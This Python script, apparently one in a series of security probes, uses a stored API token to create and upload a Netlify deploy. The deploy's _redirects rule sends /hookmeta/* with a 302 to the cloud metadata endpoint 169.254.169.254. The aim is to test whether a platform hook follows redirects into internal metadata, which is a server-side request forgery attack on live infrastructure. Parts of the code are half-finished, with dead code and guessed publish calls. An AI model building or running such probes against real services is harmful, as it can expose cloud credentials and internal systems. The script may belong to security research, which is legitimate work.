# -*- coding: utf-8 -*-
# _hk_zipdeploy.py - zip deploy SITE_A with _redirects (302 to metadata) to test hook redirect-following
import sys, os, io, json, zipfile, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import TOKEN_A, SITE_A

API = "https://api.netlify.com/api/v1"

def req(method, url, tok=None, body=None, raw_body=None, ctype=None, timeout=40):
    r = urllib.request.Request(url, method=method)
    if tok:
        r.add_header("Authorization", "Bearer " + tok)
    data = None
    if raw_body is not None:
        data = raw_body
        r.add_header("Content-Type", ctype or "application/octet-stream")
    elif body is not None:
        data = json.dumps(body).encode()
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, data=data, timeout=timeout) as resp:
            b = resp.read(60000)
            try:
                return resp.status, json.loads(b.decode("utf-8", "replace"))
            except Exception:
                return resp.status, b[:800]
    except urllib.error.HTTPError as e:
        b = e.read(4000)
        try:
            return e.code, json.loads(b.decode("utf-8", "replace"))
        except Exception:
            return e.code, b[:400]
    except Exception as ex:
        return -1, str(ex)[:300]

# build zip: index.html + _redirects (302 to metadata + a normal site page control)
buf = io.BytesIO()
z = zipfile.ZipFile(buf, "w")
z.writestr("index.html", "<html><body>hooktest</body></html>")
z.writestr("_redirects", "/hookmeta/*  https://169.254.169.254/latest/meta-data/  302\n/hookctl/*  /index.html  302\n")
z.close()
zb = buf.getvalue()
print("zip bytes:", len(zb))

# create deploy (draft), upload files, then publish - follow round3 style
s, d = req("POST", API + "/sites/%s/deploys" % SITE_A, tok=TOKEN_A, body={"title": "hook-redir-test"})
print("create deploy:", s, (d.get("id"), d.get("state")) if isinstance(d, dict) else repr(d)[:300])
if not (isinstance(d, dict) and d.get("id")):
    sys.exit(1)
DEP = d["id"]

# upload required files
reqs = [{"path": "index.html", "sha": None}, {"path": "_redirects", "sha": None}]
# netlify wants digest; use deploy files endpoint: PUT /deploys/{id}/files/{path} with raw body
for p, s_ in reqs:
    content = z.read(p) if False else None
# simpler: read from the zip we built
z2 = zipfile.ZipFile(io.BytesIO(zb))
for name in ("index.html", "_redirects"):
    data = z2.read(name)
    s, r = req("PUT", API + "/deploys/%s/files/%s" % (DEP, name), tok=TOKEN_A, raw_body=data)
    print("upload %s:" % name, s, repr(r)[:200])

# publish (state -> published) - round3 used PUT deploys/{id}? or POST /deploys/{id}? try state update
s, r = req("POST", API + "/deploys/%s" % DEP, tok=TOKEN_A, body={})
print("POST deploy(lock/publish?):", s, json.dumps(r, ensure_ascii=False)[:400] if isinstance(r, (dict, list)) else repr(r)[:300])
if isinstance(r, dict) and r.get("state"):
    print("state:", r["state"])
